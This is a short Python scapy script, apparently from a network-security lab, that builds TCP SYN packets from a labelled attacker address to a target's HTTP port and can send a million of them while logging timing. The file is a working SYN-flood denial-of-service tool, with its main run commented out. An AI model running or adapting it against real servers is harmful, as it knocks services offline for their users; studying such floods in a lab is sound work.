import scapy.all as scapy
import time
import sys

S_IP = "10.9.0.2"  # attacker ip address
S_PORT = 12345

D_IP = "10.9.0.3"  # target ip address
D_PORT = 80  # http port

SYN = "S"  # SYN flag in TCP header
SYN_TIMES_FILE = "syns_results_p.txt"


NUM_ITERATIONS = 100
NUM_PACKETS = 10000


def main():
    ip_header = scapy.IP(src=S_IP, dst=D_IP)
    tcp_header = scapy.TCP(sport=S_PORT, dport=D_PORT, flags=SYN)

    syn_packet = ip_header / tcp_header

    avg = 0

    with open(SYN_TIMES_FILE, "w") as file:

        for i in range(NUM_ITERATIONS):

            for j in range(NUM_PACKETS):

                start = time.time()
                scapy.send(syn_packet, verbose=False)
                end = time.time()

                avg += (end - start)

                file.write(f"{(i * NUM_PACKETS + j)} {(end - start)}\n")
                file.flush()

            print(f"Sent {i * 10000} packets")

        avg /= (NUM_ITERATIONS * NUM_PACKETS)
        file.write(f"{avg}")


if __name__ == "__main__":
    ip_header = scapy.IP(src=S_IP, dst=D_IP)
    tcp_header = scapy.TCP(sport=S_PORT, dport=D_PORT, flags=SYN)

    syn_packet = ip_header / tcp_header
    print(syn_packet.show())
    # try:
    #     main()
    # except KeyboardInterrupt:
    #     print("\nStopping DDoS...")
    #     sys.exit(0)
